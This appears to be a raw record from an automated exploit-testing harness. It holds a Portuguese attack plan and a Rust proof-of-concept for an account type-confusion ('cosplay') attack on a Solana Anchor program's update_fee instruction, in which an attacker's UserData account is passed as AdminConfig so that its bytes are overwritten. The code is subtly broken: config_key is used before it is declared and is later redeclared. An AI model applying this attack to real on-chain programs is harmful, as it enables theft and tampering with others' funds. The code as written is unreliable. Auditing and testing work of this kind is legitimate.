attempts.raw:
{
  "plan": "Preparamos uma conta AdminConfig legítima com admin = carteira legítima e fee = 100, e uma conta UserData com authority = atacante e balance = 0. O baseline chama update_fee com a AdminConfig e o signer legítimo, provando que o cenário está montado corretamente. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, assinada pelo atacante (cuja pubkey está nos bytes 8..40 da UserData). O efeito medido é que os bytes 40..48 da UserData passam a conter o novo fee, demonstrando que uma conta de outro tipo foi aceita e sobrescrita.",
  "scenario": "let admin = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let config_data = anchor_account_data("AdminConfig", &(admin, 100u64));
let config = account(&env.program_id, &config_data, None);

let user_data = anchor_account_data("UserData", &(attacker, 0u64));
let user_account = account(&env.program_id, &user_data, None);

let attacker_wallet = wallet(1_000_000_000);
let admin_wallet = wallet(1_000_000_000);

let baseline_ix = env.anchor_ix(
    "update_fee",
    &(200u64,),
    vec![
        AccountMeta::new(config_key, false),
        AccountMeta::new_readonly(admin, true),
    ],
);
let baseline_accounts = vec![
    (config_key, config.clone()),
    (admin, admin_wallet.clone()),
];
let baseline_result = env.baseline("legitimate update_fee", &baseline_ix, &baseline_accounts);

let config_key = Pubkey::new_unique();
let user_key = Pubkey::new_unique();

let attack_ix = env.anchor_ix(
    "update_fee",
    &(999u64,),
    vec![
        AccountMeta::new(user_key, false),
        AccountMeta::new_readonly(attacker, true),
    ],
);
let attack_accounts = vec![
    (user_key, user_account),
    (attacker, attacker_wallet),
];
let attack_result = env.attack("cosplay UserData as AdminConfig", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let after_user = after(&attack_result, &user_key);
    env.effect(
        "UserData fee field overwritten by cosplayed AdminConfig",
        read_u64(after_user.data(), 40) == 999u64,
    );
}"
}

